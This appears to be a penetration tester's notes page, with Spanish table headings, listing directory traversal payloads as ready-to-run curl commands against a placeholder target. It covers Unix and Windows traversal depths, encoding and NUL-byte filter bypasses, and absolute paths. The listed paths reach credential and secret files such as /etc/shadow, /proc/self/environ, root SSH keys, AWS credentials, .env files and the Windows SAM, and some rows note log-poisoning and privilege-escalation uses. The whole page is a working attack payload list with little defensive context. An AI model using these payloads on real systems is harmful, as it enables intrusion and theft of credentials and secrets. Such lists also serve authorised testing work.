---
aliases:
  - Path Traversal Payloads
  - DotDot Payloads
  - Absolute Path Payloads
tags:
  - type/technique
  - vuln/path-traversal
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Directory Traversal]]'
---
# Directory Traversal - Payloads Básicos

***

## Unix `../` Traversal

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=../etc/passwd'` | Single-level up read /etc/passwd | Shallow probe. |
| `curl 'https://target/?file=../../etc/passwd'` | 2 levels traversal | Common depth. |
| `curl 'https://target/?file=../../../../../../etc/passwd'` | Force-overshoot 6 levels — extra ../ ignored | Standard. |
| `for n in 1 2 3 4 5 6 7 8; do curl -s "https://target/?file=$(python3 -c "print('../'*$n)")etc/passwd" \| grep -m1 root:; done` | Iterate depths 1..8 brute traverse | Discovery. |
| `curl 'https://target/?file=../etc/passwd/'` | Trailing slash variant | Parser normalize. |
| `curl 'https://target/?file=/../etc/passwd'` | Leading slash variant | Inconsistent parsers. |
| `curl 'https://target/?file=../etc/passwd.'` | Trailing dot — Unix accepts | Filter bypass. |
| `curl 'https://target/?file=..../etc/passwd'` (4 dots) | Dot replacement filter strip pattern | Filter strips `..`. |
| `curl 'https://target/?file=./../etc/passwd'` | Self-ref prefix | Filter normalize. |
| `curl 'https://target/?file=././../etc/passwd'` | Multi self-ref | Same. |
| `curl 'https://target/?file=../etc/passwd%00'` | NUL byte truncate trailing extension | Extension append bypass. |
| `curl 'https://target/?file=..//../etc/passwd'` | Double-slash variant | Edge parse. |
| `curl 'https://target/?file=..///etc/passwd'` | Triple slash | Edge. |
| `curl 'https://target/?file=~/../etc/passwd'` | Tilde expansion abuse | Shell-like resolve. |
| `curl --data-urlencode "file=../../etc/passwd" -G https://target/` | curl helper URL-encode payload | Encode helper. |
^pt-payload-unix

___

## Windows `..\\` Traversal

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=..\windows\win.ini'` | Read win.ini (most common probe) | Windows probe. |
| `curl 'https://target/?file=..\..\windows\win.ini'` | 2 levels Windows | Common. |
| `curl 'https://target/?file=..\..\..\windows\system32\drivers\etc\hosts'` | Read hosts file | Network info. |
| `curl 'https://target/?file=../windows/win.ini'` | Forward slash Windows tolerates | Mixed slash. |
| `curl 'https://target/?file=..\windows/win.ini'` | Mixed back/forward slash | Mixed. |
| `curl 'https://target/?file=C:\windows\win.ini'` | Absolute Windows path no traversal | Absolute path. |
| `curl 'https://target/?file=..%5Cwindows%5Cwin.ini'` | URL-encoded backslash | Encode bypass. |
| `curl 'https://target/?file=\\?\C:\windows\win.ini'` | UNC long path | UNC bypass. |
| `curl 'https://target/?file=..\windows\win.ini.'` | Trailing dot Windows strips | Extension check bypass. |
| `curl 'https://target/?file=..\windows\win.ini '` (trailing space) | Trailing space Windows strips | Bypass. |
| `curl 'https://target/?file=..\PROGRA~1\config.txt'` | 8.3 short filename | Legacy short name. |
| `curl 'https://target/?file=C:\inetpub\wwwroot\web.config'` | IIS web.config | IIS app. |
| `curl 'https://target/?file=C:\xampp\apache\conf\httpd.conf'` | XAMPP Apache config | XAMPP. |
| `curl 'https://target/?file=..\..\boot.ini'` | Legacy boot config Windows | Legacy. |
| `curl 'https://target/?file=file.txt::$DATA'` | NTFS alternate data stream | NTFS-specific. |
| `curl 'https://target/?file=..\windows\system32\config\SAM'` | SAM hashes (locked while running) | Locked-but-possible. |
^pt-payload-windows

___

## Mixed Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=..%2fetc%2fpasswd'` | URL-encoded forward slash | Standard URL encode. |
| `curl 'https://target/?file=..%5cetc%5cpasswd'` | URL-encoded backslash | Backslash variant. |
| `curl 'https://target/?file=..%252fetc%252fpasswd'` | Double URL-encoded `%252f` | Multi-decode bypass. |
| `curl 'https://target/?file=..%255cetc%255cpasswd'` | Double URL-encoded backslash | Multi-decode. |
| `curl 'https://target/?file=..%c0%afetc%c0%afpasswd'` | UTF-8 overlong slash (legacy) | Pre-2010 servers. |
| `curl 'https://target/?file=..%c1%9cetc%c1%9cpasswd'` | UTF-8 overlong backslash | Legacy. |
| `curl --data-urlencode "file=..／etc／passwd" -G https://target/` (U+FF0F full-width) | Unicode full-width slash | NFKC normalize. |
| `curl 'https://target/?file=..&#x2f;etc&#x2f;passwd'` (HTML reflected context) | HTML entity slash | Reflected HTML. |
| `curl 'https://target/?file=..%00.\..\etc\passwd'` | NUL byte truncate | Truncate. |
| `curl 'https://target/?file=..\057etc\057passwd'` | Octal slash | Edge literal. |
| `curl 'https://target/?file=..\x2fetc\x2fpasswd'` | Hex escape slash | Edge interpreter. |
| `python3 -c "print(''.join('%%%02x' % ord(c) for c in '../../etc/passwd'))"` | Custom hex percent-encode | DIY encoder. |
| `python3 -c "import urllib.parse as u; print(u.quote(u.quote('../../etc/passwd')))"` | Double URL-encode | Multi-decode chain. |
| `curl 'https://target/?file=..\..\..%c0%aeetc%c0%aepasswd'` | UTF-8 overlong dot | Edge legacy. |
| `curl --data-urlencode "file=../+../etc/passwd" -G https://target/` | Plus-encoded space (URL form) | URL form-encode. |
^pt-payload-mixed

___

## Absolute Paths

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=/etc/passwd'` | Linux users list | Standard target. |
| `curl 'https://target/?file=/etc/shadow'` | Hash file (root-only) | Privileged. |
| `curl 'https://target/?file=/proc/self/environ'` | Process environment vars (secrets!) | High-value. |
| `curl 'https://target/?file=/proc/self/cmdline'` | Process command-line args | Process recon. |
| `curl 'https://target/?file=/proc/self/status'` | Process status info | Process recon. |
| `curl 'https://target/?file=/proc/self/maps'` | Memory map | Memory recon. |
| `curl 'https://target/?file=/proc/version'` | Kernel version | OS recon. |
| `curl 'https://target/?file=/proc/self/fd/0'` | Process FD 0 (stdin) | FD probe. |
| `curl 'https://target/?file=/etc/hostname'` | System hostname | Recon. |
| `curl 'https://target/?file=/etc/issue'` | OS release info | Recon. |
| `curl 'https://target/?file=/etc/hosts'` | Hosts file network info | Network recon. |
| `curl 'https://target/?file=/var/www/html/config.php'` | PHP app config | App secrets. |
| `curl 'https://target/?file=/etc/apache2/sites-enabled/000-default.conf'` | Apache vhost config | Web config. |
| `curl 'https://target/?file=/etc/nginx/sites-enabled/default'` | nginx vhost config | Web config. |
| `curl 'https://target/?file=/var/log/apache2/access.log'` | Apache access log (RCE pivot via log poison) | Log poison. |
| `curl 'https://target/?file=/var/log/nginx/access.log'` | nginx access log | Log poison. |
| `curl 'https://target/?file=/root/.ssh/id_rsa'` | Root SSH private key | Privesc. |
| `curl 'https://target/?file=/home/USERNAME/.ssh/id_rsa'` | User SSH key | Lateral. |
| `curl 'https://target/?file=/root/.bash_history'` | Bash history command secrets | Post-exploit. |
| `curl 'https://target/?file=/root/.aws/credentials'` | AWS credentials | Cloud creds. |
| `curl 'https://target/?file=/etc/tomcat9/tomcat-users.xml'` | Tomcat user/pass | Tomcat. |
| `curl 'https://target/?file=/var/lib/jenkins/secrets.xml'` | Jenkins secrets master key | Jenkins. |
| `curl 'https://target/?file=/var/www/html/.git/config'` | Git repo config (origin URL leak) | Git leak. |
| `curl 'https://target/?file=/var/www/html/.env'` | Dotenv file secrets | Modern app secrets. |
| `curl 'https://target/?file=C:\inetpub\wwwroot\web.config'` | IIS web.config connection strings | IIS. |
| `curl 'https://target/?file=C:\xampp\apache\conf\httpd.conf'` | XAMPP Apache config | XAMPP. |
| `curl 'https://target/?file=C:\windows\system32\config\SAM'` | SAM (locked while running) | Edge. |
| `curl 'https://target/?file=C:\Users\Administrator\.ssh\id_rsa'` | Windows admin SSH key | Win privesc. |
^pt-payload-absolute

***
